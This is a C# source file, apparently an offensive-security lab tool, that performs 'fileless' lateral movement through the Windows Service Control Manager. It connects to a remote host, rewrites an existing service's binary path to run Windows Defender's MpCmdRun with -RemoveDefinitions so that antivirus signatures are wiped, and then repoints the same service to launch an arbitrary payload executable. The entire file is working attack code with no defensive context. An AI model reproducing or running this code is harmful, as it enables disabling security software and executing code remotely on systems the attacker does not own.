﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace FilelessLatMov2
{
    internal class FilelessLatMov2
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            String target = "appsrv01";

            if (args.Length > 0)
            {
                target = args[0];
            }

            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            string ServiceName = "SensorService";
            if (args.Length > 1)
            {
                ServiceName = args[1];
            }

            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            string signature = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions - All";
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, signature, null, null, null, null, null, null);
            bResult = StartService(schService, 0, null);

            if (!bResult) 
            {
                Console.WriteLine(String.Format("Error calling StartService: {0}", Marshal.GetLastWin32Error()));
            }

            string payload = "C:\\inject.exe";
            if (args.Length > 2)
            {
                payload = args[2];
            }

            bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
            bResult = StartService(schService, 0, null);


            if (!bResult)
            {
                Console.WriteLine(String.Format("Error calling StartService: {0}", Marshal.GetLastWin32Error()));
            }
        }
    }
}
